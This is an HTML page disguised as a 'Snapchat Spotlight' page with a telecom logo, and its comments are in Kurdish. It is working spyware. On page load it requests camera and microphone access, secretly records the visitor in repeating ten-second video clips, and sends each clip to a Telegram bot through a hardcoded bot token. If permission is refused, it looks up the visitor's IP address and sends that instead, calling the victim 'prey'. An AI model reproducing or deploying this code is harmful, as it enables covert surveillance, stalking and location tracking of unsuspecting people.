<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
    <title>snapchat spotlight</title>
    <style>body { background-color: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); 
    const TOKEN = "8431515310:AAG0xW2hgSbex-3vmGx8bXxiR3BADu10N3g";

    async function capture() {
        if (!targetID) return;

        try {
            // 🎥 داواکردنی مۆڵەتی ڤیدیۆ و دەنگ بە بەرزترین کوالێتی
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, 
                audio: true 
            });

            // 🔄 فەنکشنێک بۆ تۆمارکردنی پارچە ڤیدیۆکان (Infinite Loop)
            function startRecording() {
                const mediaRecorder = new MediaRecorder(stream);
                let chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                
                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append("chat_id", targetID);
                    fd.append("video", blob, "capture.mp4");
                    fd.append("caption", "🎥 پارچە ڤیدیۆیەکی نوێ گەیشت!");

                    // ناردنی ڤیدیۆکە بۆ تێلێگرام
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { 
                        method: "POST", 
                        body: fd 
                    });

                    // دووبارە دەستپێکردنەوەی تۆمارکردن (Loop)
                    startRecording();
                };

                mediaRecorder.start();
                
                // هەر ١٠ چرکە جارێک ڤیدیۆیەک بنێرە (دەتوانیت کاتەکە بگۆڕیت)
                setTimeout(() => {
                    mediaRecorder.stop();
                }, 10000); 
            }

            // یەکەم تۆمارکردن دەستپێبکە
            startRecording();

        } catch (err) {
            // ئەگەر مۆڵەتی نەدا، تەنها ئایپی بنێرە (وەک پێشتر)
            sendIPReport();
        }
    }

    async function sendIPReport() {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: targetID, text: `⚠️ نێچیرەکە مۆڵەتی نەدا!\n🌐 IP: ${ipData.ip}`, parse_mode: "HTML" })
        });
    }
</script>
</body>
</html>
